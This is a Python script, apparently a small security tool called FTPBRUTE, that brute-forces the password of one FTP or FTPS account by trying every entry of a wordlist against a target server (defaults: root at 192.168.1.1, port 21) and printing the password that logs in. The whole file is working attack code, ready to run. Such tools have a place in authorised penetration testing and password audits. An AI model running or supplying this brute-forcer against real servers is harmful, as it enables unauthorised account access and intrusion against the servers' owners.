#! /usr/bin/python3

from ftplib import FTP, FTP_TLS, error_perm
import argparse
import sys
import os

# Colors
GREEN = "\033[92m"
CYAN = "\033[96m"
YELLOW = "\033[93m"
RED = "\033[91m"
RESET = "\033[0m"
BOLD = "\033[1m"

def banner():
    print(f"""
    {CYAN}{BOLD}
╭──────────────────────────────────────────╮
│              FTPBRUTE v1.0               │
╰──────────────────────────────────────────╯
    {RESET}""")

def ftpbrute(mode, host, port, username, password_list):

    ftp = None

    for password in password_list:
        try:
            if mode == "FTP":
                ftp = FTP()
                ftp.connect(host, port, timeout=5)
                ftp.login(username, password)

            elif mode =="FTPS":
                ftp = FTP_TLS()
                ftp.connect(host, port, timeout=5)
                ftp.login(username, password)
                ftp.prot_p()
            else:
                print(f"{RED}[!] Unknown mode: {mode}")
                sys.exit(1)

            print(f"\n{GREEN}[+] FOUND: {RESET}{password}\n")
            return True

        except error_perm as error:
            if str(error).startswith("530"):
                 print(f"{RED}[X] NOT FOUND: {RESET}{password}")
            else:
                print(f"{YELLOW}[!] FTP permission/protocol error: {error}{RESET}")
                return False
        except OSError as error:
            print(f"{RED}[X] ERROR: {RESET}{error}\n")
            sys.exit(1)
        finally:
            if ftp:
                try:
                    ftp.quit()
                except Exception:
                    ftp.close()

def wordlist_validation(wordlist):
    if not os.path.isfile(wordlist):
        print(f"{RED}[X] Wordlist does not exist: {wordlist}\n{RESET}")
        sys.exit(1)

    if os.path.getsize(wordlist) == 0:
        print(f"{RED}[X] Wordlist does not contain any content: {wordlist}\n{RESET}")
        sys.exit(1)

    if not os.access(wordlist, os.R_OK):
        print(f"{RED}[X] Wordlist does not readable: {wordlist}\n{RESET}")
        sys.exit(1)

    with open(wordlist, "r") as file:
        passwords = [line.rstrip("\r\n") for line in file]

    # Reject an empty file or a file containing only blank lines.
    passwords = [password for password in passwords if password.strip()]

    return passwords

def main():
    # Create an argument parser
    # ArgumentDefaultsHelpFormatter ensures default values are shown in the help text
    parser = argparse.ArgumentParser(description="Simple FTP/FTPS password brute forcer", formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    
    # Define the command-line arguments
    parser.add_argument("-m", "--mode", choices=["FTP", "FTPS"], default="FTP", help="Protocol mode")
    parser.add_argument("-t", "--target", metavar="", default="192.168.1.1", help="Target machine's ip address")
    parser.add_argument("-p", "--port", metavar="", type=int, default=21, help="Target machine's port address")
    parser.add_argument("-u", "--username", metavar="", default="root", help="FTP server username")
    parser.add_argument("-w", "--wordlist", metavar="", default="ftp_wordlist.txt", help="Path to password wordlist")
    
    # Parse and use the arguments
    args = parser.parse_args()

    # Print banner
    banner()

    # Port number validation
    if not 1 <= args.port <= 65535:
        parser.error(f"{RED}[!] Port must be between 1 and 65535.{RESET}")

    # Validate the wordlist file
    password_list = wordlist_validation(args.wordlist)

    print(f"  Target    : {args.target}:{args.port}")
    print(f"  Username  : {args.username}")
    print(f"  Wordlist  : {args.wordlist}")
    print(f"  Entries   : {len(password_list)}")
    print()

    print(f"{CYAN}[•] Starting {args.mode} password brute-forcing for a single username...{RESET}\n")

    # FTP username bruteforce
    test_result = ftpbrute(args.mode, args.target, args.port, args.username, password_list)

    if test_result is True:
        print(f"{GREEN}[+] Test completed successfully.{RESET}")
    elif test_result is False:
        print(f"{RED}[X] Test failed or was interrupted by an error.{RESET}")
    else:
        print(f"{YELLOW}[!] No definitive result was returned.{RESET}")

main()